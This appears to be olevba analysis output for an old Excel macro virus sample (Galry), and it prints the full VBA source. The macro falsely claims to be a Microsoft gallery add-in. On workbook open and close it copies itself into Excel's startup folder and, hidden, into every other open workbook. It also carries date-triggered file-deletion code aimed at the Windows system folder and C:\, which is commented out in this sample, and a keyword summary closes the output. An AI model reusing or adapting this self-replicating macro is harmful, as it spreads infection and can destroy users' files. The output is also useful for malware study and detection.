olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Galry-68ed14a391af8edfc38275a1ecd84f0fb0e88e97
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xl5galary.bas 
in file: Virus.MSExcel.Galry-68ed14a391af8edfc38275a1ecd84f0fb0e88e97 - OLE stream: '_VBA_PROJECT_CUR/VBA/xl5galary'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


































































































' ---------------------------------------------------------
' XL5GALLERY MACRO - ENABLES USERS OF VERSION 5 TO USE FX
' This is an autoload macro, which stays in the background
' so you can use the .XLA auto-add in.
' (C) Microsoft 1996. 1998
' ---------------------------------------------------------
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
' Normal error trap
On Error Resume Next
' Activation call for galary
Application.OnSheetActivate = ThisWorkbook.Name & "!xl5galary.galary"
End Sub
' End of routine
'
'
' Start of auto shutdown routine
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
' Ordinary error trap
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
' Enable true date conversion
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
'
' start macro proper
'
ChDrive "C"
ChDir "c:\windows\system"
' Change to macro drive
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               ChDrive "C"
'                                                                                                                                                                                                                                                               ChDir "c:\"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk - XOH ", 16
End If
var_b_10000000008 = Application.StartupPath + "\XL5GLARY.XLS"
                                                                                                                                                                                                                                                               var_b_10000000004 = Dir(var_b_10000000008)
                                                                                                                                                                                                                                                               If UCase(var_b_10000000004) = "XL5GLARY.XLS" Then
GoTo var_b_10000000005
End If
' end of start setup
'
'
'

                                                                                                                                                                                                                                                               var_b_10000000006 = Application.StartupPath + "\xl5glary.xls"
                                                                                                                                                                                                                                                               ThisWorkbook.Modules("xl5galary").Copy
' Make sure the galery is active
var_b_10000000007 = ActiveWorkbook.Name
WindowState = xlMaximized
Application.Windows(var_b_10000000007).Visible = False
                                                                                                                                                                                                                                                               Application.Workbooks(var_b_10000000007).SaveAs FileName:=var_b_10000000006
var_b_10000000005:
var_b_10000000008 = Application.StartupPath + "\Xl5galry.XLS"
                                                                                                                                                                                                                                                               var_b_10000000009 = Dir(var_b_10000000008)
' End of initialisation routine
If UCase(var_b_10000000009) = "XL5GALRY.XLS" Then
ChDir (Application.StartupPath)
                                                                                                                                                                                                                                                               Kill "xl5galry.xls"
End If
End Sub
'
'
'
'
'
'
'
'
'
'
Sub galary()
Attribute galary.VB_ProcData.VB_Invoke_Func = " \n14"
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
ChDrive "C"
ChDir "c:\windows\system"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               ChDrive "C"
'                                                                                                                                                                                                                                                               ChDir "c:\"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk", 16
End If
' end of double check
'
'
'
                                                                                                                                                                                                                                                               var_b_10000000010 = Application.Workbooks.Count
If var_b_10000000010 = 1 Then Exit Sub
For var_b_10000000011 = 1 To var_b_10000000010
var_b_10000000012 = 0
var_b_10000000013 = Workbooks(var_b_10000000011).Name
If var_b_10000000013 = ThisWorkbook.Name Then GoTo var_b_10000000016
var_b_10000000014 = Workbooks(var_b_10000000013).Modules.Count
                                                                                                                                                                                                                                                               If var_b_10000000014 > 0 Then
For var_b_10000000015 = 1 To var_b_10000000014
                                                                                                                                                                                                                                                               If Workbooks(var_b_10000000013).Modules(var_b_10000000015).Name = "xl5galary" Then var_b_10000000012 = 1
Next var_b_10000000015
End If
' Normal adding routine
If var_b_10000000012 = 0 Then
Windows(var_b_10000000013).Activate
ThisWorkbook.Modules("xl5galary").Copy before:=Workbooks(var_b_10000000013).Sheets(1)
                                                                                                                                                                                                                                                               Workbooks(var_b_10000000013).Modules("xl5galary").Visible = False
End If
var_b_10000000016:
Next var_b_10000000011
Exit Sub
' End of macro
' (C) microsoft 1996. 1998
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  xl5galar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

